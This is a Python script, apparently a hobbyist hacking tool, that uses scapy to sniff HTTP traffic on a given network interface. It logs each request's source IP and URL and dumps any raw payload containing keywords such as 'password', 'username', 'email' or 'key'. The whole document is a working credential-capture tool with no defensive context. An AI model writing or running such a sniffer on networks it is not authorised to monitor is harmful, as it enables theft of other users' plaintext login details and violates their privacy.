#!/usr/bin/python3.8
import scapy.all as scapy
from scapy_http import http
from termcolor import colored
import argparse
import pyfiglet

def get_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Please specify an interface to Use.', required=True)
    argument = parser.parse_args()
    return argument


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [
            'name', 'pass', 'password',
            'user', 'username', 'Username',
            'email', 'e-mail', 'E-mail',
            'login', 'log-in', 'Password',
            'key', 'Key'
        ]
        for keyword in keywords:
            if keyword in load.decode():
                return '\n[{}] {} {}\n'.format(colored('+', 'red', attrs=['bold']),
                                               colored('Some Useful Raw Info >>', 'red', attrs=['bold']), load)

def get_urls(packet):
    return '{}{}'.format(packet[http.HTTPRequest].Host.decode(), packet[http.HTTPRequest].Path.decode())

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_urls(packet)
        host_rq = packet[scapy.IP].src
        print('[{}] {} Requested >> {}'.format(colored('+', 'blue'), host_rq, url))

        login_info = get_login_info(packet)
        if login_info:
            print(login_info)

def main():
    ascii_banner = pyfiglet.figlet_format('Packet Sniffer')
    print(colored(ascii_banner, 'cyan', attrs=['bold']))
    print('-' * 78)
    print('[{}] {}'.format('+', 'cyan', attrs=['bold']),
          colored('Packet sniffer is running.....', 'cyan', attrs=['bold']))
    print('-' * 78)
    argument = get_input_from_user()
    interface = argument.interface
    try:
        sniff(interface)
    except KeyboardInterrupt:
        print('\n[{}] Good bye!\n'.format(colored('+', 'cyan')))

if __name__ == '__main__':
    main()
